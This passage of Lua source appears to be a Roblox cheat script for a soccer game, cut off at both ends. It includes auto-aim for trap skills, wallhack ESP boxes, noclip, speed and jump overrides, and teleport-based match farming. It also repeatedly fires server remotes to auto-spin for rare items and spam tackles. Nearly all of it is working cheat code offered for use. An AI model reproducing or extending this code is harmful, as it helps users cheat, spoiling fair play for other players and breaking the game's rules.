				else
					return game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner4')
				end	
			end
		end
	end
	return
end
function GetClosestPoint(corner)
	direction = (corner.CFrame.p-getgenv().BallOwner.Character.HumanoidRootPart.CFrame.p).Unit
	local Ray1 = Ray.new(corner.CFrame.p + (direction * 30), (getgenv().BallOwner.Character.HumanoidRootPart.CFrame.p-corner.CFrame.p).Unit)
	return Ray1:ClosestPoint(MyHRP.CFrame.p)
end
task.spawn(function()
	while task.wait() do
		task.spawn(function()
			if getgenv().IsAutoTrapping then
				if HoldingSkill() == 'Creative Trap' then
					pcall(function()
						if MyPlayer:GetAttribute('Playing') and not MyChar:FindFirstChild('Ball') and getgenv().BallOwner ~= '' and getgenv().BallOwner ~= MyPlayer and GetClosestCorner() and GetClosestPoint(GetClosestCorner()) and workspace.CurrentCamera.CameraType ~= Enum.CameraType.Scriptable then
							MyChar.Humanoid.AutoRotate = false
							if GetClosestCorner() == game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner1') or GetClosestCorner() == game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner4') then
								local p1 = GetClosestPoint(GetClosestCorner())
								local l = (MyHRP.CFrame.p-p1).Magnitude
								local g = math.sqrt(34^2 + 8^2)
								local k = math.sqrt(g^2-l^2)
								local direction = (getgenv().BallOwner.Character.HumanoidRootPart.CFrame.p - GetClosestCorner().CFrame.p).Unit
								local p2 = p1 + (direction * k)
								if (MyHRP.CFrame.p - p2).Magnitude <= 35 then
									MyHRP.CFrame = CFrame.new(MyHRP.CFrame.p, p2) * CFrame.Angles(0,math.rad(-13.24),0)
								end
							elseif GetClosestCorner() == game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner2') or GetClosestCorner() == game:GetService('Workspace'):WaitForChild('Corners'):WaitForChild('Corner3') then
								local p1 = GetClosestPoint(GetClosestCorner())
								local l = (MyHRP.CFrame.p-p1).Magnitude
								local g = math.sqrt(34^2 + 8^2)
								local k = math.sqrt(g^2-l^2)
								local direction = (getgenv().BallOwner.Character.HumanoidRootPart.CFrame.p - GetClosestCorner().CFrame.p).Unit
								local p2 = p1 + (direction * k)
								if (MyHRP.CFrame.p - p2).Magnitude <= 35 then
									MyHRP.CFrame = CFrame.new(MyHRP.CFrame.p, p2) * CFrame.Angles(0,math.rad(13.24),0)
								end
							end
						end
					end)
				elseif MyPlayer:GetAttribute('Playing') and workspace.CurrentCamera.CameraType ~= Enum.CameraType.Scriptable and not getgenv().IsAutoAim then
					MyChar.Humanoid.AutoRotate = true					
				end
			end
		end)
	end
end)
task.spawn(function()
	while task.wait() do
		if getgenv().IsAutoTrapping and getgenv().BallOwner ~= MyPlayer and not MyChar:FindFirstChild('Ball') and getgenv().BallOwner ~= '' and Players:FindFirstChild(getgenv().BallOwner.Name) and Players[getgenv().BallOwner.Name].Character then
			for _, anim in pairs(getgenv().BallOwner.Character.Humanoid:GetPlayingAnimationTracks()) do
				if anim.Animation.AnimationId == 'rbxassetid://13732545430' and getgenv().BallOwner.Character:FindFirstChild('Ball') then
					if HoldingSkill() then
						if HoldingSkill() == 'Creative Trap' then
							CreativeTrap()							
						elseif HoldingSkill() == 'Zero Reset Turn' then
							RTZ()
							wait(1.5)
						elseif HoldingSkill() == 'Black Hole Trap' then
							BlackHole()
							wait(1.5)
						end
					end
				elseif anim.Animation.AnimationId == 'rbxassetid://12699056251' and anim.TimePosition > 0.25 then
					if HoldingSkill() then
						if HoldingSkill() == 'Creative Trap' then
							CreativeTrap()
							wait(1.5)
						elseif HoldingSkill() == 'Zero Reset Turn' then
							RTZ()
							wait(1.5)
						elseif HoldingSkill() == 'Black Hole Trap' then
							BlackHole()
							wait(1.5)
						end
					end
				elseif anim.Animation.AnimationId == 'rbxassetid://14085400141' and (GetBall().CFrame.p-getgenv().BallOwner.Character.HumanoidRootPart.CFrame.p).Magnitude < 12.35 then
					BlackHole()
					wait(1.5)
				end
			end
		end
	end
end)
--[[task.spawn(function()
	while task.wait() do
		if getgenv().IsAutoTrapping and getgenv().BallOwner ~= MyPlayer and GetRealBall() then
			local vel = GetRealBall().Ball.AssemblyLinearVelocity
			local ballpos = GetRealBall().Ball.Position
			if (MyHRP.Position - ballpos).Magnitude <= 30 and vel.x <=5 and vel.z <=5 and vel.y >= 10 and not BlackHoleSlot.CDFrame.Visible then
				task.spawn(function()
					repeat
						MyHRP.CFrame = CFrame.new(MyHRP.Position, Vector3.new(ballpos.X, MyHRP.Position.Y, ballpos.Z))
						task.wait()
					until MyPlayer:GetAttribute('UsingSkill')
				end)
				BlackHole()
				wait(1.5)
			end
		elseif getgenv().IsAutoTrapping and getgenv().BallOwner ~= MyPlayer and not MyChar:FindFirstChild('Ball') and getgenv().BallOwner ~= '' and Players:FindFirstChild(getgenv().BallOwner.Name) and Players[getgenv().BallOwner.Name].Character then
			local pos = getgenv().BallOwner.Character.HumanoidRootPart.Position+(getgenv().BallOwner.Character.Humanoid.MoveDirection*2)+(getgenv().BallOwner.Character.HumanoidRootPart.CFrame.LookVector*2)
			MyHRP.CFrame = CFrame.new(MyHRP.Position, Vector3.new(pos.X,MyHRP.Position.Y,pos.Z))
		end
	end				
end)]]
game:GetService('RunService').Stepped:Connect(function()
	if getgenv().WalkSpeedToggle then
		local function WalkSpeedChange()
			if getgenv().WalkSpeedToggle then
				if MyChar and MyChar.Humanoid then
					MyChar.Humanoid.WalkSpeed = getgenv().CurrentSpeed
				end
			end
		end
		local Human = MyChar and MyChar:FindFirstChildWhichIsA('Humanoid')
		WalkSpeedChange()
		HumanMods.wsLoop = (HumanMods.wsLoop and HumanMods.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal('WalkSpeed'):Connect(WalkSpeedChange)
		HumanMods.wsCA = (HumanMods.wsCA and HumanMods.wsCA:Disconnect() and false) or MyCharAdded:Connect(function(nChar)
			MyChar = nChar, nChar:WaitForChild('Humanoid')
			WalkSpeedChange()
			HumanMods.wsLoop = (HumanMods.wsLoop and HumanMods.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal('WalkSpeed'):Connect(WalkSpeedChange)
		end)
	else
		HumanMods.wsLoop = (HumanMods.wsLoop and HumanMods.wsLoop:Disconnect() and false) or nil
		HumanMods.wsCA = (HumanMods.wsCA and HumanMods.wsCA:Disconnect() and false) or nil
	end
	if getgenv().JumpPowerToggle then
		local function JumpPowerChange()
			if getgenv().JumpPowerToggle then
				if MyChar and MyChar.Humanoid then
					if MyChar:FindFirstChildOfClass('Humanoid').UseJumpPower then
						MyChar:FindFirstChildOfClass('Humanoid').JumpPower = getgenv().CurrentJumpPower
					else
						MyChar:FindFirstChildOfClass('Humanoid').JumpHeight  = getgenv().CurrentJumpPower
					end
				end
			end
		end
		local Human = MyChar and MyChar:FindFirstChildWhichIsA('Humanoid')
		JumpPowerChange()
		HumanMods.jpLoop = (HumanMods.jpLoop and HumanMods.jpLoop:Disconnect() and false) or Human:GetPropertyChangedSignal('JumpPower'):Connect(JumpPowerChange)
		HumanMods.jpCA = (HumanMods.jpCA and HumanMods.jpCA:Disconnect() and false) or MyCharAdded:Connect(function(nChar)
			MyChar = nChar, nChar:WaitForChild('Humanoid')
			JumpPowerChange()
			HumanMods.jpLoop = (HumanMods.jpLoop and HumanMods.jpLoop:Disconnect() and false) or Human:GetPropertyChangedSignal('JumpPower'):Connect(JumpPowerChange)
		end)
	else
		HumanMods.jpLoop = (HumanMods.jpLoop and HumanMods.jpLoop:Disconnect() and false) or nil
		HumanMods.jpLoop = (HumanMods.jpLoop and HumanMods.jpLoop:Disconnect() and false) or nil
	end
end)

--Player Functions
function ListServers(cursor)
	local Raw = game:HttpGet(_servers .. ((cursor and '&cursor='..cursor) or ''))
	return Http:JSONDecode(Raw)
end
function NoclipLoop()
    if Clip == false and MyChar ~= nil then
        for _, child in pairs(MyChar:GetDescendants()) do
            if child:IsA('BasePart') and child.CanCollide == true then
                child.CanCollide = false
            end
        end
    end
end

--ESP Functions
local DefaultSettings = {
    Esp = {
        NamesEnabled = false,
        DisplayNamesEnabled = false,
        DistanceEnabled = false,
        HealthEnabled = false,
        BoxEsp = false,
        TeamColors = false,
        Thickness = 1.5,
        Transparency = .9,
        Size = 20,
        RenderDistance = 9e9,
        Color = Color3.fromRGB(0, 255, 5),
        OutlineColor = Color3new(),
        BlacklistedTeams = {}
    }
}
local EspSettings = DefaultSettings.Esp
local CustomGet = {
    [0] = function()
        return {}
    end
}
local Get;
if (CustomGet[PlaceId]) then
    Get = CustomGet[PlaceId]();
end
local GetCharacter = function(Player)
    if (Get) then
        return Get.GetCharacter(Player);
    end
    return Player.Character
end
local CharacterAdded = function(Player, Callback)
    if (Get) then
        return
    end
    Player.CharacterAdded:Connect(Callback);
end
local CharacterRemoving = function(Player, Callback)
    if (Get) then
        return
    end
    Player.CharacterRemoving:Connect(Callback);
end
local GetTeam = function(Player)
    if (Get) then
        return Get.GetTeam(Player);
    end
    return Player.Team
end
local HandlePlayer = function(Player)
    local Character = GetCharacter(Player);
    if (Character) then
        Characters[Player] = Character
    end
    CharacterAdded(Player, function(Char)
        Characters[Player] = Char
    end);
    CharacterRemoving(Player, function(Char)
        Characters[Player] = nil
        local PlayerDrawings = Drawings[Player]
        if (PlayerDrawings) then
            PlayerDrawings.Text.Visible = false
            PlayerDrawings.Box.Visible = false
        end
    end);
    if (Player == MyPlayer) then return; end
    local Text = Drawing.new('Text');
    Text.Color = EspSettings.Color
    Text.OutlineColor = EspSettings.OutlineColor
    Text.Size = EspSettings.Size
    Text.Transparency = EspSettings.Transparency
    Text.Center = true
    Text.Outline = true
    local Box = Drawing.new('Quad');
    Box.Thickness = EspSettings.Thickness
    Box.Transparency = EspSettings.Transparency
    Box.Filled = false
    Box.Color = EspSettings.Color
    Drawings[Player] = { Text = Text, Box = Box }
end
for Index, Player in pairs(Players:GetPlayers()) do
    HandlePlayer(Player);
end
Players.PlayerAdded:Connect(function(Player)
    HandlePlayer(Player);
end);
Players.PlayerRemoving:Connect(function(Player)
    Characters[Player] = nil
    local PlayerDrawings = Drawings[Player]
    for Index, Drawing in pairs(PlayerDrawings or {}) do
        Drawing.Visible = false
    end
    Drawings[Player] = nil
end);
local SetProperties = function(Properties)
    for Player, PlayerDrawings in pairs(Drawings) do
        if (type(Player) ~= 'number') then
            for Property, Value in pairs(Properties.Text or {}) do
                PlayerDrawings.Text[Property] = Value
            end
            for Property, Value in pairs(Properties.Box or {}) do
                PlayerDrawings.Box[Property] = Value
            end
        end
    end
end
local GetClosestPlayerAndRender = function()
	MouseVector = Vector2new(Mouse.X, Mouse.Y + Inset);
	local Closest = create(4);
	local Vector2Distance = math.huge
	local Vector3DistanceOnScreen = math.huge
	local Vector3Distance = math.huge
	local LocalRoot = Characters[MyPlayer] and FindFirstChild(Characters[MyPlayer], 'HumanoidRootPart');
	for Player, Character in pairs(Characters) do
		if (Player == MyPlayer) then continue; end
		local PlayerDrawings = Drawings[Player]
		local PlayerRoot = FindFirstChild(Character, 'HumanoidRootPart');
		local PlayerTeam = GetTeam(Player);
		if (PlayerRoot) then
			local Redirect = FindFirstChild(Character, 'Head');
			if (not Redirect) then
				PlayerDrawings.Text.Visible = false
				PlayerDrawings.Box.Visible = false
				continue;
			end
			local RedirectPos = Redirect.Position
			local Tuple, Visible = WorldToViewportPoint(CurrentCamera, RedirectPos);
			local CharacterVec2 = Vector2new(Tuple.X, Tuple.Y);
			local Vector2Magnitude = (MouseVector - CharacterVec2).Magnitude
			local Vector3Magnitude = LocalRoot and (RedirectPos - LocalRoot.Position).Magnitude or math.huge
			local InRenderDistance = Vector3Magnitude <= EspSettings.RenderDistance
			if (InRenderDistance and getgenv().PlrESPChecker == true and Visible and not Tfind(EspSettings.BlacklistedTeams, PlayerTeam)) then
				local CharacterHumanoid = FindFirstChildWhichIsA(Character, 'Humanoid') or { Health = 0, MaxHealth = 0 };
				PlayerDrawings.Text.Text = format('%s\n%s%s',
						EspSettings.NamesEnabled and Player.Name or '',
						EspSettings.DistanceEnabled and format('[%s]',
							floor(Vector3Magnitude)
						) or '',
						EspSettings.HealthEnabled and format(' [%s/%s]',
							floor(CharacterHumanoid.Health),
							floor(CharacterHumanoid.MaxHealth)
						)  or ''
					);

				PlayerDrawings.Text.Position = Vector2new(Tuple.X, Tuple.Y - 40);
				if (EspSettings.BoxEsp) then
					local Parts = {}
					for Index, Part in pairs(Character:GetChildren()) do
						if (IsA(Part, 'BasePart')) then
							local ViewportPos = WorldToViewportPoint(CurrentCamera, Part.Position);
							Parts[Part] = Vector2new(ViewportPos.X, ViewportPos.Y);
						end
					end
					local Top, Bottom, Left, Right
					local Distance = math.huge
					local ClosestPart = nil
					for i2, Pos in next, Parts do
						local Mag = (Pos - Vector2new(Tuple.X, 0)).Magnitude;
						if (Mag <= Distance) then
							ClosestPart = Pos
							Distance = Mag
						end
					end
					Top = ClosestPart
					ClosestPart = nil
					Distance = math.huge
					for i2, Pos in next, Parts do
						local Mag = (Pos - Vector2new(Tuple.X, CurrentCamera.ViewportSize.Y)).Magnitude;
						if (Mag <= Distance) then
							ClosestPart = Pos
							Distance = Mag
						end
					end
					Bottom = ClosestPart
					ClosestPart = nil
					Distance = math.huge
					for i2, Pos in next, Parts do
						local Mag = (Pos - Vector2new(0, Tuple.Y)).Magnitude;
						if (Mag <= Distance) then
							ClosestPart = Pos
							Distance = Mag
						end
					end
					Left = ClosestPart
					ClosestPart = nil
					Distance = math.huge
					for i2, Pos in next, Parts do
						local Mag = (Pos - Vector2new(CurrentCamera.ViewportSize.X, Tuple.Y)).Magnitude;
						if (Mag <= Distance) then
							ClosestPart = Pos
							Distance = Mag
						end
					end
					Right = ClosestPart
					ClosestPart = nil
					Distance = math.huge
					PlayerDrawings.Box.PointA = Vector2new(Right.X, Top.Y);
					PlayerDrawings.Box.PointB = Vector2new(Left.X, Top.Y);
					PlayerDrawings.Box.PointC = Vector2new(Left.X, Bottom.Y);
					PlayerDrawings.Box.PointD = Vector2new(Right.X, Bottom.Y);
				end
				if (EspSettings.TeamColors) then
					local TeamColor;
					if (PlayerTeam) then
						local BrickTeamColor = PlayerTeam.TeamColor
						TeamColor = BrickTeamColor.Color
					else
						TeamColor = Color3new(0.639216, 0.635294, 0.647059);
					end
					PlayerDrawings.Text.Color = TeamColor
					PlayerDrawings.Box.Color = TeamColor
				end
				PlayerDrawings.Text.Visible = true
				PlayerDrawings.Box.Visible = EspSettings.BoxEsp
			else
				PlayerDrawings.Text.Visible = false
				PlayerDrawings.Box.Visible = false
			end			
		else
			PlayerDrawings.Text.Visible = false
			PlayerDrawings.Box.Visible = false
		end
	end
	return unpack(Closest);
end
ToggleESP = RunService.RenderStepped:Connect(GetClosestPlayerAndRender)

--Game functions
local WeaponList = {
	[1] = 'Direct Shot',
	[2] = 'Finesse Shot',
	[4] = 'Explosive Acceleration',
	[5] = 'Stealthy Steps',
	[6] = 'Jumping Power',
	[7] = 'Immense Speed',
	[8] = 'Mark Smell',
	[9] = 'Drive Shot',
	[10] = 'Elastic Dribbling',
	[11] = 'Trapping',
	[12] = 'Perfect Kick Accuracy',
	[13] = 'Villainous Soccer',
	[14] = 'Total Defense',
	[15] = 'Godspeed',
	[16] = 'Kaiser Impact'
}
local ProdigyList = {
	[1] = 'None',
	[2] = 'Intellect',
	[3] = 'Punch',
	[4] = 'Defense',
	[5] = 'Speed',
	[6] = 'Dribble',
	[7] = 'Ball Control'
}
function Spin()
	if getgenv().SpinType == 'Weapon' then
		if getgenv().Slot == '1' then
			repeat
				for Weapon,_ in pairs(Options.WeaponsDropdown.Value) do
					if Weapon == MyPlayer.Data:GetAttribute('Weapon1') then
						WSpin = true
						print('You got '..MyPlayer.Data:GetAttribute('Weapon1'))
						getgenv().IsAutoSpin = false
					end
				end
				if not WSpin then
					local args = {
						[1] = tonumber(getgenv().Slot)}
					game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('SpinWeapon'):FireServer(unpack(args))
					wait(0.25)
				end
			until WSpin or not getgenv().IsAutoSpin
		elseif getgenv().Slot == '2' then
			repeat
				for Weapon,_ in pairs(Options.WeaponsDropdown.Value) do
					if Weapon == MyPlayer.Data:GetAttribute('Weapon2') then
						WSpin = true
						print('You got '..MyPlayer.Data:GetAttribute('Weapon2'))
						getgenv().IsAutoSpin = false
					end
				end
				if not WSpin then
					local args = {
						[1] = tonumber(getgenv().Slot)}
					game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('SpinWeapon'):FireServer(unpack(args))
					wait(0.25)					
				end
			until WSpin or not getgenv().IsAutoSpin
		elseif getgenv().Slot == '3' then
			repeat
				for Weapon,_ in pairs(Options.WeaponsDropdown.Value) do
					if Weapon == MyPlayer.Data:GetAttribute('Weapon3') then
						WSpin = true
						print('You got '..MyPlayer.Data:GetAttribute('Weapon3'))
						getgenv().IsAutoSpin = false
					end
				end
				if not WSpin then
					local args = {
						[1] = tonumber(getgenv().Slot)}
					game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('SpinWeapon'):FireServer(unpack(args))
					wait(0.25)
				end
			until WSpin or not getgenv().IsAutoSpin
		end
	elseif getgenv().SpinType == 'Prodigy' then
		repeat
			for Prodigy,_ in pairs(Options.ProdigiesDropdown.Value) do
				if Prodigy == MyPlayer.Data:GetAttribute('Prodigy') then
					WSpin = true
					print('You got '..MyPlayer.Data:GetAttribute('Prodigy'))
					getgenv().IsAutoSpin = false
				end
			end
			if not WSpin then
				game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('SpinProdigy'):FireServer()
				wait(0.25)
			end
		until WSpin or not getgenv().IsAutoSpin
	end
end
local GameStarting = {
	[1] = 'Choosing positions: 10 Seconds left',
	[2] = 'Choosing positions: 9 Seconds left',
	[3] = 'Choosing positions: 8 Seconds left',
	[4] = 'Choosing positions: 7 Seconds left',
	[5] = 'Choosing positions: 6 Seconds left',
	[6] = 'Choosing positions: 5 Seconds left',
	[7] = 'Choosing positions: 4 Seconds left',
	[8] = 'Choosing positions: 3 Seconds left',
	[9] = 'Choosing positions: 2 Seconds left',
	[10] = 'Choosing positions: 1 Seconds left'
}
function ChoosePosition()
	repeat task.wait() until (table.find(GameStarting, MyPlayer.PlayerGui.GameStatusGui.GameStatus.Text)) or (not getgenv().IsAutoPosition)
	if not(tostring(game:GetService('ReplicatedStorage').Teams[tostring(getgenv().Team)]:GetAttribute(getgenv().Position)) == MyPlayer.Name) then
		repeat task.wait()
			local args = {
				[1] = getgenv().Position,
				[2] = getgenv().Team
			} 
			game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('ChoosePosition'):FireServer(unpack(args))
		until (tostring(game:GetService('ReplicatedStorage').Teams[tostring(getgenv().Team)]:GetAttribute(getgenv().Position)) == MyPlayer.Name) or (not getgenv().IsAutoPosition)
	end
end
function Buy()
	local args = {
		[1] = getgenv().Cosmetics}
	game:GetService('ReplicatedStorage').Remotes.BuyCosmetics:FireServer(unpack(args))
	wait(0.1)
end
function Delete()
	local OwnedCosmetics = {}
	local Duplicates = {}
	for i,v in pairs(MyPlayer.OwnedEmotes:GetChildren()) do
		if not table.find(OwnedCosmetics, v.Name) then
			table.insert(OwnedCosmetics, v.Name)
		else
			table.insert(Duplicates, v)
		end
	end
	for i,v in pairs(MyPlayer.OwnedAccessories:GetChildren()) do
		if not table.find(OwnedCosmetics, v.Name) then
			table.insert(OwnedCosmetics, v.Name)
		else
			table.insert(Duplicates, v)
		end
	end
	for i,v in pairs(Duplicates) do
		local args = {
			[1] = v:GetAttribute('ID')}		
		game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DeleteCosmetic'):FireServer(unpack(args))
		wait(0.1)
	end
end
function CanUseSkill()
	if not MyPlayer:GetAttribute("UsingSkill") and not MyPlayer.PlayerStateFolder:FindFirstChild('Stund') and MyHRP.CFrame.UpVector ~= Vector3.new(0,1,0) and MyHRP.CFrame.UpVector ~= Vector3.new(-0,1,0) and MyHRP.CFrame.RightVector ~= Vector3.new(1,0,0) then
		return true
	end
	return false
end
function PowerfulShot()
	if PlaceId ~= 12467817668 and MyChar:FindFirstChild('Ball') then
		local timeover = false
		task.spawn(function()
			task.wait(1.5)
			timeover = true
		end)
		repeat task.wait() until CanUseSkill()
		if not timeover then
			if MyPlayer.PlayerGui.SkilsGui.SlotEight.SkillName.Text ~= '' and not MyPlayer.PlayerGui.SkilsGui.SlotEight.CDFrame.Visible then
				local args = {
					[1] = 'Hold',
					[2] = MyPlayer.PlayerGui.SkilsGui.SlotEight.SkillName.Text}
				game:GetService('ReplicatedStorage').Remotes.TranciverRemote:FireServer(unpack(args))
				local args = {
					[1] = 'UseSkill',
					[2] = MyPlayer.PlayerGui.SkilsGui.SlotEight.SkillName.Text}
				game:GetService('ReplicatedStorage').Remotes.TranciverRemote:FireServer(unpack(args))
			end
		end
	end
end
function BicycleKick()
	if PlaceId ~= 12467817668 and MyChar:FindFirstChild('Ball') then
		local timeover = false
		task.spawn(function()
			task.wait(1.5)
			timeover = true
		end)
		repeat task.wait() until CanUseSkill()
		if not timeover then
			if MyPlayer.PlayerGui.SkilsGui.SlotSix.SkillName.Text ~= '' and (not MyPlayer.PlayerGui.SkilsGui.SlotSix.CDFrame.Visible) then
				--getgenv().IsReverse = true
				local args = {
					[1] = 'LobPass',
					[2] = MyChar:WaitForChild('Ball'),
					[3] = MyHRP.Position + (MyChar.Humanoid.MoveDirection * 5)}		
				game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('PunchRemote'):FireServer(unpack(args))
				local args = {
					[1] = 'Hold',
					[2] = MyPlayer.PlayerGui.SkilsGui.SlotSix.SkillName.Text}
				game:GetService('ReplicatedStorage').Remotes.TranciverRemote:FireServer(unpack(args))
				local args = {
					[1] = 'UseSkill',
					[2] = MyPlayer.PlayerGui.SkilsGui.SlotSix.SkillName.Text}
				game:GetService('ReplicatedStorage').Remotes.TranciverRemote:FireServer(unpack(args))
				--[[task.spawn(function()
					task.wait(1)
					getgenv().IsReverse = false
				end)]]
			else
				getgenv().IsReverse = true
				local Remote = game:GetService("ReplicatedStorage").Remotes.UseKeyboardSkillRemote
				local rayp = RaycastParams.new()
				rayp.FilterDescendantsInstances = {workspace.Effects, MyChar}
				rayp.FilterType = Enum.RaycastFilterType.Exclude
				local args = {
					[1] = 'LobPass',
					[2] = MyChar:WaitForChild('Ball'),
					[3] = MyHRP.Position}		
				game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('PunchRemote'):FireServer(unpack(args))
				Remote:FireServer('KickThroughYourself', workspace:Raycast(MyHRP.Position, Vector3.new(0,-5,0), rayp), CurrentCamera.CFrame.LookVector)
				local vel = Instance.new("BodyVelocity")
				vel.Parent = MyHRP
				vel.P = 5000
				vel.MaxForce = Vector3.new(100000, 100000, 100000)
				vel.Velocity = Vector3.new(0,20,0)
				wait(0.5)
				vel:Destroy()
				task.spawn(function()
					task.wait(1)
					getgenv().IsReverse = false
				end) 
			end
		end
	end		
end
local BannedSpeeds = {
	[1] = 0,
	[2] = 15,
	[3] = 17,
	[4] = 20,
	[5] = 22,
	[6] = 25,
	[7] = 27
}
function ChangeSpeed()
	if getgenv().IsSpeedDemon and not table.find(BannedSpeeds, MyChar.Humanoid.WalkSpeed) then
		SpeedChange:Disconnect()
		MyChar.Humanoid.WalkSpeed += getgenv().SpeedBoost
		SpeedChange = MyChar.Humanoid:GetPropertyChangedSignal('WalkSpeed'):Connect(ChangeSpeed)
	end
end
SpeedChange = MyChar.Humanoid:GetPropertyChangedSignal('WalkSpeed'):Connect(ChangeSpeed)
task.spawn(function()
	while task.wait() do
		if getgenv().IsSpeedDemon then
            if MyChar:FindFirstChild('HoldingSkill') and MyChar:WaitForChild('HoldingSkill'):GetAttribute('SkillName') == 'Long-Distance Sprinting' then
                getgenv().SpeedBoost *= 2
                repeat task.wait() until not MyChar:FindFirstChild('HoldingSkill')
                getgenv().SpeedBoost /= 2
            end
            if MyHRP:FindFirstChild('BodyVelocity') and MyHRP:WaitForChild('BodyVelocity').Velocity.Magnitude > 2 then
                if MyHRP:WaitForChild('BodyVelocity').Velocity.Magnitude >= 57 and MyHRP:WaitForChild('BodyVelocity').Velocity.Magnitude < 58 then
                    MyHRP:WaitForChild('BodyVelocity').Velocity *= 1.15
                elseif MyHRP:WaitForChild('BodyVelocity').Velocity.Magnitude >= 24 and MyHRP:WaitForChild('BodyVelocity').Velocity.Magnitude < 26 then
                    MyHRP:WaitForChild('BodyVelocity').Velocity *= 1.2
                end
            end
		end
	end
end)
function BeginGame()
    local args = {
        [1] = 'Begin Game'
    }    
    game:GetService('ReplicatedStorage'):WaitForChild('TrainingRoomRemotes'):WaitForChild('Commands'):FireServer(unpack(args))
end
function PlayMatch()
	if getgenv().AFKTarget ~= 'None' then
		BeginGame()
		repeat task.wait() until MyPlayer:GetAttribute('Playing')
		Clip = false
		getgenv().Noclipping = game:GetService('RunService').Stepped:Connect(NoclipLoop)
		task.spawn(function()
			while MyPlayer:GetAttribute('Playing') do task.wait()
				if MyChar.Humanoid.WalkSpeed ~= 0 then
					MyHRP.CFrame = CFrame.new(-459.389282, -93.0298462, -368.699829, -0.999780118, 1.15958221e-08, -0.0209698491, 1.13763603e-08, 1, 1.05849018e-08, 0.0209698491, 1.03440136e-08, -0.999780118)
				end
			end
		end)
		repeat task.wait() until MyChar.Humanoid.WalkSpeed ~= 0
		repeat
			if GetBall() then
				local args = {
					[1] = 'TackleBegin'}
				game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('UseKeyboardSkillRemote'):FireServer(unpack(args))
				local args = {
					[1] = 'Tackle',
					[2] = GetBall(),
					[3] = GetBall().CFrame
				}		
				game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('UseKeyboardSkillRemote'):FireServer(unpack(args))
			end
			task.wait()
		until MyPlayer.PlayerGui.GameStatusGui.GoalLabel.Visible or (not MyPlayer:GetAttribute('Playing'))
		repeat task.wait() until (not MyPlayer:GetAttribute('Playing'))
		Clip = true
		getgenv().Noclipping:Disconnect()
	end
end
function PlayLeagueMatch()
	repeat task.wait() until MyChar.Torso:FindFirstChild('Torso')
	local team1 = false
	local team2 = false
	for i,v in pairs(game:GetService('ReplicatedStorage').Teams['1']:GetAttributes()) do
		if v == MyPlayer.Name then
			team1 = true
		end
	end
	for i,v in pairs(game:GetService('ReplicatedStorage').Teams['2']:GetAttributes()) do
		if v == MyPlayer.Name then
			team2 = true
		end
	end
	Clip = false
	getgenv().Noclipping = game:GetService('RunService').Stepped:Connect(NoclipLoop)
	repeat task.wait() until IsBallInGame()
	if not MyChar:FindFirstChild('Ball') then
		task.spawn(function()
			repeat
				if team1 then
					MyHRP.CFrame = CFrame.new(-663.387085, -94.1178436, 371.810394, -0.999397099, 8.17453767e-08, -0.0347189642, 8.04340416e-08, 1, 3.91667072e-08, 0.0347189642, 3.63505066e-08, -0.999397099)
				elseif team2 then
					MyHRP.CFrame = CFrame.new(-1118.29041, -94.1178589, 373.184998, -0.998213291, 3.39337767e-08, -0.0597511828, 3.46157556e-08, 1, -1.03784998e-08, 0.0597511828, -1.24282886e-08, -0.998213291)
				end
				task.wait()
			until not getgenv().IsLeagueFarm
		end)
	else
		repeat task.wait() until MyChar.Humanoid.WalkSpeed ~= 0
		task.spawn(function()
			repeat
				if team1 then
					MyHRP.CFrame = CFrame.new(-663.387085, -94.1178436, 371.810394, -0.999397099, 8.17453767e-08, -0.0347189642, 8.04340416e-08, 1, 3.91667072e-08, 0.0347189642, 3.63505066e-08, -0.999397099)
				elseif team2 then
					MyHRP.CFrame = CFrame.new(-1118.29041, -94.1178589, 373.184998, -0.998213291, 3.39337767e-08, -0.0597511828, 3.46157556e-08, 1, -1.03784998e-08, 0.0597511828, -1.24282886e-08, -0.998213291)
				end
				task.wait()
			until not getgenv().IsLeagueFarm
		end)
	end
	repeat		
		for i,v in pairs(Players:GetChildren()) do
			if v ~= MyPlayer then
				if v.Character:FindFirstChild('Ball') then
					repeat task.wait() until MyChar.Humanoid.WalkSpeed ~= 0
					repeat
						if v.Character:FindFirstChild('Ball') then
							local args = {
								[1] = 'TackleBegin'}
							game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('UseKeyboardSkillRemote'):FireServer(unpack(args))
							local args = {
								[1] = 'Tackle',
								[2] = v.Character.Ball.Ball,
								[3] = v.Character.Ball.Ball.CFrame
							}		
							game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('UseKeyboardSkillRemote'):FireServer(unpack(args))
						end
						task.wait()
					until MyChar:FindFirstChild('Ball') or (not MyChar.Torso:FindFirstChild('Torso'))
				end
			end
		end
		task.wait()
	until (not MyChar.Torso:FindFirstChild('Torso')) or not getgenv().IsLeagueFarm
	Clip = true
	getgenv().Noclipping:Disconnect()
end
function DailyChallenge()
	if PlaceId == 13864400206 then
		repeat task.wait()
			repeat task.wait() until MyChar:FindFirstChild('Ball')
			if game:GetService('Workspace').GameField.BlueLockmans.Spot1.Position == Vector3.new(342.4703674316406, 3.814638137817383, -713.7109985351562) then
				local args = {
					[1] = 'PunchBall',
					[2] = MyChar:FindFirstChild('Ball'),
					[3] = 1.25,
					[4] = Vector3.new(0.9485578536987305, -0.28204798698425293, 0.1438293308019638),
					[5] = Vector3.new(0.9885718822479248, 0.016017595306038857, 0.14989666640758514)
				}
				game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('UseKeyboardSkillRemote'):FireServer(unpack(args))
			elseif game:GetService('Workspace').GameField.BlueLockmans.Spot1.Position == Vector3.new(298.120361328125, 3.814638137817383, -758.5650024414062) then
				local args = {
